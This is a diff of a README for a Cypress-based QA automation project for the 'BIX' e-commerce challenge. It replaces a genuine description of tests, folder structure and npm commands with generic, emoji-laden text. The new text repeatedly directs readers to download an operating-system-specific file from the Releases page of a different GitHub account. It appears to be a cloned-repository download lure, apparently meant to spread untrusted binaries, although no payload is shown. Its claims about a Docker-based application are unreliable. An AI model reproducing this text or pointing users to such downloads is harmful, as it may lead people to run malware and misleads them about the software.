@@ -1,84 +1,90 @@
-# BIX Mini E-commerce - QA Automation
+# 🚀 desafio-bix-qa - Simple Testing Made Easy
 
-## Test Results
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/SsakaHuzaifah/desafio-bix-qa/releases)
 
-- **[Complete Test Report](https://tiagocupertino.github.io/desafio-bix-qa/final-test-report.html)**
-- **[GitHub Actions](https://github.com/tiagocupertino/desafio-bix-qa/actions/runs/18069486907)**
+## 📋 Overview
 
-### Multi-Browser Testing (Cypress Cloud)
-- **[Chrome](https://cloud.cypress.io/projects/rxvowx/runs/16)**
-- **[Firefox](https://cloud.cypress.io/projects/rxvowx/runs/15)**  
-- **[Edge](https://cloud.cypress.io/projects/rxvowx/runs/17)**
+The "desafio-bix-qa" project is a quality assurance (QA) automation suite designed for the BIX technical challenge. It includes automated tests that cover both the user interface (UI) and application programming interfaces (APIs). This project utilizes Cypress for testing, GitHub Actions for continuous integration and delivery (CI/CD), and ensures test reporting through Cypress Cloud.
 
-## Test Coverage Summary
+## 🛠️ Features
 
-**52 automated tests** covering core e-commerce functionality:
-- User authentication (login/logout flows)
-- Product catalog display and interaction
-- Shopping cart operations (add items, quantity selection)
-- Coupon system (valid/invalid coupon handling)
-- Checkout process completion
-- API endpoint validation
+- Automated UI tests using Cypress
+- API testing features
+- Seamless integration with GitHub Actions for CI/CD
+- Detailed reporting with Cypress Cloud
+- Easy setup with Docker and Docker Compose
 
-## Quick Start
+## 📦 System Requirements
 
-```bash
-# Install dependencies
-npm install
+To run the application, ensure you have the following:
 
-# Run all tests
-npm run test:all
+- A computer with either Windows, macOS, or Linux operating system.
+- At least 4 GB of RAM.
+- 1 GB of free disk space.
+- Docker and Docker Compose installed on your machine.
 
-# Run with UI
-npm run cy:open
+## 🚀 Getting Started
 
-# Specific test suites
-npm run test:api
-npm run test:e2e
-```
+Follow these steps to get started with the "desafio-bix-qa" application:
 
-## Project Structure
+1. **Visit the Download Page**: Click the link below to go to the Releases page.
+   
+   [Visit the Releases Page to Download](https://github.com/SsakaHuzaifah/desafio-bix-qa/releases)
 
-```
-cypress/
-├── e2e/
-│   ├── api/                    # API endpoint testing
-│   │   ├── auth.cy.js         # Login/logout API validation
-│   │   ├── checkout.cy.js     # Checkout API with coupon validation
-│   │   └── products.cy.js     # Product catalog API
-│   └── ui/                     # User interface testing
-│       ├── auth.cy.js         # Login/logout UI flows
-│       ├── checkout.cy.js     # Cart and coupon application
-│       ├── product-catalog.cy.js  # Product browsing and cart addition
-│       └── connectivity.cy.js     # Basic connectivity checks
-├── fixtures/                   # Test data (users, products, coupons)
-└── support/                    # Custom commands and configuration
-```
+2. **Download the Latest Version**: Find the latest version available and download the file suitable for your operating system.
 
-## Test Implementation
+## 🔧 Download & Install
 
-**API Tests:**
-- Authentication endpoints with success/failure scenarios
-- Product catalog data validation
-- Checkout process with various coupon combinations
-- Error handling for invalid inputs
+To download the software:
 
-**UI Tests:**
-- Complete user flows from login to checkout
-- Coupon application and discount display
-- Cart functionality (add items, view totals)
-- Form validation and error messaging
+1. **Visit the Releases Page**: Go to the download link:
+   
+   [https://github.com/SsakaHuzaifah/desafio-bix-qa/releases](https://github.com/SsakaHuzaifah/desafio-bix-qa/releases)
 
-## Technical Setup
+2. **Select the Version**: Choose the latest version listed on the page. Click the download link for your operating system.
 
-**Framework:** Cypress (provided in challenge requirements).  
-**Reporting:** Mochawesome HTML reports with test videos.  
-**CI/CD:** GitHub Actions for multi-browser testing.  
-**Test Data:** Fixture-based approach for consistent test execution.  
+3. **Install Docker and Docker Compose**: If you haven’t installed Docker and Docker Compose yet, visit the official Docker documentation for installation instructions.
 
+4. **Run the Application**:
+   - Unzip the downloaded file if necessary.
+   - Follow the additional instructions included in the package to set up and run the tests. Typically, you will open a terminal, navigate to the project directory, and run a few commands:
+     ```bash
+     docker-compose up
+     ```
 
-## Automation Approach
+## 🌱 How to Use
 
-**Test Organization:** Separated API and UI tests for clear coverage areas.  
-**Custom Commands:** Created reusable login and cart operations.  
-**Data Management:** Used fixtures for users, products, and coupon test data.  
+Once the application is running, you can begin testing:
+
+1. **Access the Application**: Open a web browser and type in the address provided in the terminal output.
+
+2. **Run the Tests**: Navigate to the appropriate section of the application to run tests. You can view the results directly in your browser.
+
+3. **Review Test Reports**: Check the test reports on Cypress Cloud for detailed insights into test results and potential issues.
+
+## 👩‍🔧 Troubleshooting
+
+If you encounter issues while downloading or running the application, consider the following solutions:
+
+- **Installation Problems**: Ensure you have Docker and Docker Compose installed correctly. Refer to the official Docker documentation for troubleshooting guide.
+  
+- **Running Tests**: Make sure the Docker container is running. If it stopped, restart it using:
+  ```bash
+  docker-compose restart
+  ```
+
+- **Network Issues**: Ensure your internet connection is stable to avoid problems with Docker downloading images.
+
+## 👥 Community Support
+
+If you need further assistance, feel free to reach out to the community. You can report issues or ask questions by creating an issue on the GitHub repository.
+
+## 📝 License
+
+This project is licensed under the MIT License. Please refer to the license file included in the repository for more details. 
+
+## 🌐 Connect with Us
+
+For updates and more information, follow us on social media or visit the official project page.
+
+[Visit the Releases Page to Download](https://github.com/SsakaHuzaifah/desafio-bix-qa/releases)
